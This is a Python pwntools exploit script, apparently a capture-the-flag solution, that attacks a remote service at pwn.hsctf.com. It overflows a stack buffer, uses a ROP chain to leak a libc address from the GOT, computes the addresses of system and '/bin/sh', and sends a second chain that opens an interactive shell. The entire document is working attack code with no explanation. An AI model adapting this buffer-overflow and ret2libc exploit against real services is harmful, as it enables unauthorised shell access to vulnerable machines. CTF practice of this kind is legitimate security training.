from pwn import *
context.arch = "x86_64"

host= "pwn.hsctf.com"
port= 3333
r = remote(host, port)

buf = 0x38
write = 0x0000000000400606
read_plt = 0x00000000004004b0
read_got = 0x601020
pop_rdi = 0x0000000000400703
pop_rsi = 0x0000000000400701 # pop rsi; pop r15; ret;
main = 0x000000000040062e

payload = 'a' * buf
payload += flat([pop_rsi,read_got])
payload += flat([0x15])
payload += flat(write)
payload += flat([0xdeadbeef])
payload += flat(main)

r.sendline(payload)
# r.recvuntil("Tell me a story:")
r.recvuntil("Tell me a story: \n")
rcv  = u64(r.recv(8))
print(hex(rcv))
print('======')

sys = rcv - 0xb1ec0
bin_sh = rcv + 0x95b07


rop = 'a' * buf
rop += flat([pop_rdi,bin_sh,sys])
# print(rop)
r.sendline(rop)
# print(payload)

r.interactive()


